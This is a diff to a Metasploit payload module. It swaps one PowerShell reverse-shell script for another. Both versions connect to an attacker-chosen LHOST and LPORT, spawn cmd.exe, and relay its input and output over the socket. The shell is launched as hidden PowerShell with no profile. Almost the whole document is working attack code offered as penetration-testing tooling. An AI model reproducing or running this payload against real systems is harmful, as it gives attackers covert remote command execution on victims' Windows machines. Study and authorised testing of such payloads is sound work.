@@ -10,7 +10,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 1481
+  CachedSize = 1228
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -57,57 +57,45 @@ module MetasploitModule
   def command_string
     lhost = datastore['LHOST']
     lport = datastore['LPORT']
-    powershell = %Q^
-$a='#{lhost}';
-$b=#{lport};
-$c=New-Object system.net.sockets.tcpclient;
-$nb=New-Object System.Byte[] $c.ReceiveBufferSize;
-$ob=New-Object System.Byte[] 65536;
-$eb=New-Object System.Byte[] 65536;
-$e=new-object System.Text.UTF8Encoding;
-$p=New-Object System.Diagnostics.Process;
-$p.StartInfo.FileName='cmd.exe';
-$p.StartInfo.RedirectStandardInput=1;
-$p.StartInfo.RedirectStandardOutput=1;
-$p.StartInfo.RedirectStandardError=1;
-$p.StartInfo.UseShellExecute=0;
-$q=$p.Start();
-$is=$p.StandardInput;
-$os=$p.StandardOutput;
-$es=$p.StandardError;
-$osread=$os.BaseStream.ReadAsync($ob, 0, $ob.Length);
-$esread=$es.BaseStream.ReadAsync($eb, 0, $eb.Length);
-$c.connect($a,$b);
-$s=$c.GetStream();
-while ($true) {
-    start-sleep -m 100;
-    if ($osread.IsCompleted -and $osread.Result -ne 0) {
-      $s.Write($ob,0,$osread.Result);
-      $s.Flush();
-      $osread = $os.BaseStream.ReadAsync($ob, 0, $ob.Length);
-    }
-    if ($esread.IsCompleted -and $esread.Result -ne 0) {
-      $s.Write($eb,0,$esread.Result);
-      $s.Flush();
-      $esread = $es.BaseStream.ReadAsync($eb, 0, $eb.Length);
-    }
-    if ($s.DataAvailable) {
-      $r=$s.Read($nb,0,$nb.Length);
-      if ($r -lt 1) {
-          break;
-      } else {
-          $str=$e.GetString($nb,0,$r);
-          $is.write($str);
-      }
-    }
-    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {
-        break;
-    };
-    if ($p.ExitCode -ne $null) {
-        break;
-    };
-};
-^.gsub!("\n", "")
+    powershell = "function RSC{"\
+          "if ($c.Connected -eq $true) {$c.Close()};"\
+          "if ($p.ExitCode -ne $null) {$p.Close()};"\
+          "exit;"\
+        "};"\
+        "$a='#{lhost}';$p='#{lport}';$c=New-Object system.net.sockets.tcpclient;"\
+        "$c.connect($a,$p);$s=$c.GetStream();"\
+        "$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"\
+        "$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';"\
+        "$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;"\
+        "$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;"\
+        "$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;"\
+        "while($os.Peek() -ne -1){"\
+          "$o += $e.GetString($os.Read())"\
+        "};"\
+        "$s.Write($e.GetBytes($o),0,$o.Length);"\
+        "$o=$null;$d=$false;$t=0;"\
+        "while (-not $d) {"\
+          "if ($c.Connected -ne $true) {RSC};"\
+          "$pos=0;$i=1; "\
+          "while (($i -gt 0) -and ($pos -lt $nb.Length)) {"\
+            "$r=$s.Read($nb,$pos,$nb.Length - $pos);"\
+            "$pos+=$r;"\
+            "if (-not $pos -or $pos -eq 0) {RSC};"\
+            "if ($nb[0..$($pos-1)] -contains 10) {break}};"\
+            "if ($pos -gt 0){"\
+              "$str=$e.GetString($nb,0,$pos);"\
+              "$is.write($str);start-sleep 1;"\
+              "if ($p.ExitCode -ne $null){RSC}else{"\
+                "$o=$e.GetString($os.Read());"\
+                "while($os.Peek() -ne -1){"\
+                  "$o += $e.GetString($os.Read());"\
+                  "if ($o -eq $str) {$o=''}"\
+                "};"\
+                "$s.Write($e.GetBytes($o),0,$o.length);"\
+                "$o=$null;"\
+                "$str=$null"\
+              "}"\
+            "}else{RSC}};"\
 
     "powershell -w hidden -nop -c #{powershell}"
   end
